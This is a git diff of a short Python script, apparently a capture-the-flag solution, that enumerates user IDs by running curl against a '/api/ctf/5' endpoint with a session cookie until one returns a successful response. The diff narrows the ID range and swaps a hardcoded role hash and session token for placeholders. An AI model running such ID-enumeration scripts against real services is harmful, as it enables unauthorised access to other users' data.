@@ -1,5 +1,5 @@
 import os,json
-for uid in range(1,100000000):
+for uid in range(100336889,100336889+200):
     uid1 = str(uid)
     response = os.popen("curl 'http://45.113.201.36/api/ctf/5?uid="+uid1+"' \
   -H 'Connection: keep-alive' \
@@ -8,7 +8,7 @@ for uid in range(1,100000000):
   -H 'X-Requested-With: XMLHttpRequest' \
   -H 'Referer: http://45.113.201.36/user.html' \
   -H 'Accept-Language: zh-CN,zh;q=0.9' \
-  -H 'Cookie: role=ee11cbb19052e40b07aac0ca060c23ee; session=eyJ1aWQiOiIxMTAxODUyNzEifQ.X5PYTg.OvGEmqZuNTkWw2Qec0W2GzEXvGg' \
+  -H 'Cookie: role=<YOUR OWN ROLE>; session=<YOUR OWN SESSIONS>' \
   --compressed \
   --insecure").read()
     
@@ -19,6 +19,7 @@ for uid in range(1,100000000):
 
 
 print("--------------------------------------------------------")
-print("success_uid = "+success_uid)
+print("success_uid = "+str(success_uid))
 print("success_response = "+success_response)
 print("--------------------------------------------------------")
+#Esonhugh skyworship
